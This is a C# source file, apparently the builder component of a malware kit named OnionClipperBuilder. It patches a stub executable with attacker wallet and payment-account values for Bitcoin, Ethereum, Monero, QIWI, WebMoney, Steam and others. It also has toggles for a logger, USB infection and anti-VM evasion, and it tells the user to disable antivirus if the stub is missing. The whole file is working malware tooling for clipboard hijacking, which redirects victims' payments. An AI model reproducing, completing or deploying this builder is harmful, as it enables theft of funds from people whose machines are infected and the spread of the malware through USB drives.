/* 
    Author : Megavolt
    Github : github.com/
	Telegram Group :
	Telegram Author : t.me/megavoltcoder
*/
using Mono.Cecil;
using Mono.Cecil.Cil;
using System;
using System.IO;
using System.Collections.Generic;

namespace OnionClipperBuilder
{
    internal sealed class build
    {
        public static Dictionary<string, string> ConfigValues = new Dictionary<string, string>
        {
            { "BTC", "" },
            { "Etherium", "" },
            { "LiteCoin", "" },
            { "Monero", "" },

            { "SBER", "" },
            { "MSB", "" },
            { "QIWIC", "" },
			
            { "QIWI", "" },
            { "YANDEXMONEY", "" },
            { "MEGAD", "" },
            { "STEAM", "" },
            { "YDISK", "" },
            { "DONAT", "" },
			
            { "QIWIKOP", "" },

            { "QIWINIK", "" },
			
            { "PAYER", "" },
            { "WMR", "" },
			{ "WMZ", "" },
            { "WMX", "" },
			{ "WMU", "" },
			
			{ "IPL", "" },
            { "logger", "" },
            { "Infectionusb", "" },
            { "antivm", "" },
            { "dotmemory", "" },



        };
        private static AssemblyDefinition ReadStub()
        {
            string stub = "stub\\stub.exe";
            if (!File.Exists(stub))
                cli.ShowError(stub + " not found! Try disable antivirus and download again.");
            return AssemblyDefinition.ReadAssembly(stub);
        }

        // Write stub
        private static void WriteStub(AssemblyDefinition definition, string filename)
        {
            definition.Write(filename);
        }

        // Replace values in config
        private static string ReplaceConfigParams(string value)
        {
            foreach (KeyValuePair<string, string> config in ConfigValues)
                if (value.Equals($"--- {config.Key} ---"))
                    return config.Value;

            return value;
        }

        // Проходим по всем классам, строкам и заменяем значения.
        public static AssemblyDefinition IterValues(AssemblyDefinition definition)
        {
            foreach (ModuleDefinition definition2 in definition.Modules)
                foreach (TypeDefinition definition3 in definition2.Types)
                    if (definition3.Name.Equals("Config"))
                        foreach (MethodDefinition definition4 in definition3.Methods)
                            if (definition4.IsConstructor && definition4.HasBody)
                            {
                                IEnumerator<Instruction> enumerator;
                                enumerator = definition4.Body.Instructions.GetEnumerator();
                                while (enumerator.MoveNext())
                                {
                                    var current = enumerator.Current;
                                    if (current.OpCode.Code == Code.Ldstr & current.Operand is object)
                                    {
                                        string str = current.Operand.ToString();
                                        if (str.StartsWith("---") && str.EndsWith("---"))
                                            current.Operand = ReplaceConfigParams(str);
                                    }
                                }

                            }

            return definition;
        }

        // Read stub && compile
        public static string BuildStub()
        {
            var definition = ReadStub();
            definition = IterValues(definition);
            WriteStub(definition, "stub\\build.exe");
            return "stub\\build.exe";
        }

    }
}
